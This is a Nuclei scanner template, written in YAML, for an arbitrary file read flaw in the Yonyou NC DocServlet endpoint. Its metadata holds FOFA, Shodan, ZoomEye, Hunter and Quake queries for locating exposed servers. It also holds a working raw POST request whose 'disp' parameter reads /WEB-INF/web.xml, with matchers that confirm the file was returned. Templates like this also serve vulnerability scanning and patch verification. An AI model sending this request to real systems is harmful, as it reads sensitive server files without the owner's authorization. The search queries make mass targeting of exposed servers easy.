id: yonyou-nc-arbitrary-file-read
info:
  name: 用友NC nc.uap.lfw.file.action.DocServlet 任意文件读取漏洞
  author: vva
  severity: high
  description: 用友NC的nc.uap.lfw.file.action.DocServlet存在任意文件读取漏洞，可读取服务器上的敏感文件。
  metadata:
    max-request: 1
    verified: true
    fofa-query: 'app="用友-UFIDA-NC"'
    shodan-query: 'http.title:"用友" "NC"'
    zoomeye-query: 'app:"用友 NC"'
    hunter-query: 'icon_hash="1169411366"'
    quake-query: 'product:"用友 NC"'
http:
  - raw:
      - |
        POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

        pageId=login&disp=/WEB-INF/web.xml
    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<web-app"
          - "<servlet"
        condition: and
      - type: status
        status:
          - 200